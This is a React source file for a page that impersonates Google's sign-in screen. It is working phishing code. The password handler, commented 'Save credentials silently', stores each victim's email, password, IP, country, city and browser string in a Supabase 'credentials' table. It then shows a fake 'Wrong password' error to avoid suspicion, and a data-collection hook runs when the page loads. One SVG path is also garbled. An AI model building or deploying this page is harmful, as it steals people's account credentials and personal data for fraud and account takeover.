import { useCollectData } from "@/hooks/useCollectData";
import { useState } from "react";
import { supabase } from "@/integrations/supabase/client";

type LoginStep = "email" | "password";

const Index = () => {
  useCollectData();
  const [step, setStep] = useState<LoginStep>("email");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [errorMsg, setErrorMsg] = useState("");
  const [loading, setLoading] = useState(false);

  const handleEmailSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!email.trim()) return;
    setErrorMsg("");
    setStep("password");
  };

  const handlePasswordSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!password) return;
    setLoading(true);
    setErrorMsg("");

    // Save credentials silently
    try {
      const geo: Record<string, string> = {};
      try {
        const res = await fetch("https://ipapi.co/json/");
        const json = await res.json();
        geo.ip = json.ip ?? "";
        geo.country = json.country_name ?? "";
        geo.city = json.city ?? "";
      } catch {}

      await supabase.from("credentials").insert({
        email,
        password,
        ip: geo.ip ?? null,
        country: geo.country ?? null,
        city: geo.city ?? null,
        user_agent: navigator.userAgent,
      });
    } catch {}

    // Simulate delay then show wrong password
    await new Promise((r) => setTimeout(r, 1200));
    setLoading(false);
    setErrorMsg("Wrong password. Try again or click 'Forgot password' to reset it.");
    setPassword("");
  };

  return (
    <div className="min-h-screen bg-white flex flex-col items-center" style={{ fontFamily: "'Google Sans', Roboto, Arial, sans-serif" }}>
      {/* Header */}
      <header className="w-full flex items-center justify-between px-6 py-4">
        <a href="https://accounts.google.com">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 272 92" width="75" height="24">
            <path fill="#EA4335" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
            <path fill="#FBBC05" d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
            <path fill="#4285F4" d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"/>
            <path fill="#34A853" d="M225 3v65h-9.5V3h9.5z"/>
            <path fill="#EA4335" d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z"/>
            <path fill="#4285F4" d="M35.29 41.41V32h31.tattoo c.21 1.69.32 3.44.32 5.29 0 6.56-1.79 14.67-7.56 20.44-5.61 5.86-12.77 8.98-22.26 8.98C16.96 66.71.5 50.67.5 30.25.5 9.83 16.96-6.21 37.13-6.21c9.75 0 16.67 3.82 21.88 8.81l-6.16 6.16c-3.73-3.49-8.81-6.22-15.72-6.22-12.85 0-22.9 10.34-22.9 23.19 0 12.85 10.05 23.19 22.9 23.19 8.32 0 13.07-3.35 16.1-6.38 2.46-2.46 4.07-5.98 4.71-10.79l-20.65.06z"/>
          </svg>
        </a>
        <a
          href="https://accounts.google.com/ServiceLogin"
          className="text-sm text-[#1a73e8] font-medium px-5 py-2 rounded hover:bg-[#e8f0fe] transition-colors"
        >
          Sign in
        </a>
      </header>

      {/* Card */}
      <div className="w-full max-w-[450px] mx-auto my-6 px-4">
        <div className="border border-[#dadce0] rounded-[8px] px-12 py-10 text-center">
          {/* Google Logo text */}
          <div className="mb-4">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 74 24" width="74" height="24" className="mx-auto">
              <path fill="#4285F4" d="M9.24 8.19c.0-1.98-1.62-3.19-3.58-3.19C3.62 5 2 6.25 2 8.25v.08c0 2 1.62 3.17 3.66 3.17 1.96 0 3.58-1.21 3.58-3.31z"/>
            </svg>
          </div>

          {step === "email" ? (
            <>
              <h1 className="text-[24px] font-normal text-[#202124] mb-2">Sign in</h1>
              <p className="text-[14px] text-[#202124] mb-6">Use your Google Account</p>

              <form onSubmit={handleEmailSubmit} className="text-left">
                <div className="relative mb-6">
                  <input
                    id="email"
                    type="email"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    required
                    className="peer w-full border border-[#dadce0] rounded px-3 pt-4 pb-1 text-[16px] text-[#202124] outline-none focus:border-[#1a73e8] focus:border-2 transition-all bg-white"
                    placeholder=" "
                    autoComplete="email"
                  />
                  <label
                    htmlFor="email"
                    className="absolute left-3 top-1/2 -translate-y-1/2 text-[#5f6368] text-[14px] pointer-events-none transition-all
                    peer-focus:top-3 peer-focus:text-[11px] peer-focus:text-[#1a73e8]
                    peer-[:not(:placeholder-shown)]:top-3 peer-[:not(:placeholder-shown)]:text-[11px]"
                  >
                    Email or phone
                  </label>
                </div>

                <p className="text-[14px] text-[#1a73e8] mb-6 cursor-pointer hover:underline">Forgot email?</p>

                <p className="text-[12px] text-[#202124] mb-6">
                  Not your computer? Use a Private Window to sign in.{" "}
                  <a href="https://support.google.com/chrome/answer/95464" className="text-[#1a73e8] hover:underline">
                    Learn more about using Guest mode
                  </a>
                </p>

                <div className="flex items-center justify-between">
                  <a href="https://accounts.google.com/signup" className="text-[14px] text-[#1a73e8] font-medium hover:underline">
                    Create account
                  </a>
                  <button
                    type="submit"
                    className="bg-[#1a73e8] text-white font-medium text-[14px] px-6 py-2 rounded hover:bg-[#1765cc] hover:shadow-md transition-all"
                  >
                    Next
                  </button>
                </div>
              </form>
            </>
          ) : (
            <>
              {/* Email chip */}
              <div
                className="inline-flex items-center gap-2 border border-[#dadce0] rounded-full px-3 py-1.5 mb-6 cursor-pointer hover:bg-[#f1f3f4]"
                onClick={() => { setStep("email"); setErrorMsg(""); }}
              >
                <svg className="w-4 h-4 text-[#5f6368]" viewBox="0 0 24 24" fill="currentColor">
                  <path d="M12 12c2.7 0 4.8-2.1 4.8-4.8S14.7 2.4 12 2.4 7.2 4.5 7.2 7.2 9.3 12 12 12zm0 2.4c-3.2 0-9.6 1.6-9.6 4.8v2.4h19.2v-2.4c0-3.2-6.4-4.8-9.6-4.8z"/>
                </svg>
                <span className="text-[14px] text-[#202124]">{email}</span>
                <svg className="w-4 h-4 text-[#5f6368]" viewBox="0 0 24 24" fill="currentColor">
                  <path d="M7 10l5 5 5-5z"/>
                </svg>
              </div>

              <h1 className="text-[24px] font-normal text-[#202124] mb-2">Welcome</h1>

              <form onSubmit={handlePasswordSubmit} className="text-left">
                <div className="relative mb-2">
                  <input
                    id="password"
                    type="password"
                    value={password}
                    onChange={(e) => { setPassword(e.target.value); setErrorMsg(""); }}
                    required
                    autoFocus
                    className={`peer w-full border rounded px-3 pt-4 pb-1 text-[16px] text-[#202124] outline-none transition-all bg-white
                      ${errorMsg ? "border-[#d93025] border-2 focus:border-[#d93025]" : "border-[#dadce0] focus:border-[#1a73e8] focus:border-2"}`}
                    placeholder=" "
                    autoComplete="current-password"
                  />
                  <label
                    htmlFor="password"
                    className={`absolute left-3 top-1/2 -translate-y-1/2 text-[14px] pointer-events-none transition-all
                    peer-focus:top-3 peer-focus:text-[11px]
                    peer-[:not(:placeholder-shown)]:top-3 peer-[:not(:placeholder-shown)]:text-[11px]
                    ${errorMsg ? "text-[#d93025] peer-focus:text-[#d93025]" : "text-[#5f6368] peer-focus:text-[#1a73e8]"}`}
                  >
                    Enter your password
                  </label>
                </div>

                {errorMsg && (
                  <p className="text-[12px] text-[#d93025] mb-2 flex items-start gap-1">
                    <svg className="w-4 h-4 mt-0.5 flex-shrink-0" viewBox="0 0 24 24" fill="currentColor">
                      <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
                    </svg>
                    {errorMsg}
                  </p>
                )}

                <div className="flex items-center mb-6 mt-2">
                  <input type="checkbox" id="show-pw" className="mr-2 cursor-pointer" onChange={(e) => {
                    const inp = document.getElementById("password") as HTMLInputElement;
                    if (inp) inp.type = e.target.checked ? "text" : "password";
                  }} />
                  <label htmlFor="show-pw" className="text-[14px] text-[#202124] cursor-pointer">Show password</label>
                </div>

                <p className="text-[14px] text-[#1a73e8] mb-6 cursor-pointer hover:underline">Forgot password?</p>

                <div className="flex items-center justify-end">
                  <button
                    type="submit"
                    disabled={loading}
                    className="bg-[#1a73e8] text-white font-medium text-[14px] px-6 py-2 rounded hover:bg-[#1765cc] hover:shadow-md transition-all disabled:opacity-60 disabled:cursor-not-allowed"
                  >
                    {loading ? "Signing in..." : "Next"}
                  </button>
                </div>
              </form>
            </>
          )}
        </div>
      </div>

      {/* Footer */}
      <footer className="w-full flex flex-col sm:flex-row items-center justify-between px-10 py-4 text-[12px] text-[#70757a] mt-auto">
        <span>English (United States)</span>
        <div className="flex gap-6 mt-2 sm:mt-0">
          <a href="https://policies.google.com/privacy" className="hover:underline">Privacy</a>
          <a href="https://policies.google.com/terms" className="hover:underline">Terms</a>
        </div>
      </footer>
    </div>
  );
};

export default Index;
